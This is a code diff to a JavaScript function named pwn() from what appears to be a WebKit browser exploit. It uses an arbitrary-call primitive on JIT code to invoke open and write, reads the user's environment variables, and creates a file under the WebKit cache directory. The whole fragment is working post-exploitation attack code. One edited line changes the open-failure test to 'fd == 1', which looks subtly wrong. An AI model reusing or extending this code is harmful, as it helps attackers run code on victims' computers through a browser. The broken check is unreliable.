@@ -388,19 +388,19 @@ function pwn() {
     
     // open wrapper function
     function open(path, flags, mode) {
-        return arbCall(JITCode + 0x50, path, flags, mode);
+        return Number(arbCall(JITCode + 0x50, path, flags, mode || 0));
     }
     
     // write wrapper function
     function write(fd, buf, size) {
-        return arbCall("write", fd, buf, size);
+        return Number(arbCall("write", fd, buf, size));
     }
    
     log(`[+] HOME: ${getenv("HOME")}`);
     log(`[+] PATH: ${getenv("PATH")}`);
     log(`[+] USER: ${getenv("USER")}`);
     
-    let filePath = getenv("HOME") + "/Library/Caches/com.apple.WebKit.WebContent/file.txt";
+    let filePath = getenv("HOME") + "/Library/Caches/com.apple.WebKit.WebContent/log.txt";
     log(`[+] filePath: ${filePath}`);
     
     const O_RDWR = 0x0002;
@@ -409,7 +409,7 @@ function pwn() {
     
     let fd = open(filePath, O_RDWR | O_CREAT | O_TRUNC, 0644);
     // check if it failed
-    if (Number(fd) == 0xFFFFFFFFFFFFFFFF) {
+    if (fd == 1) {
         log("[+] Failed to open file!");
         return;
     }
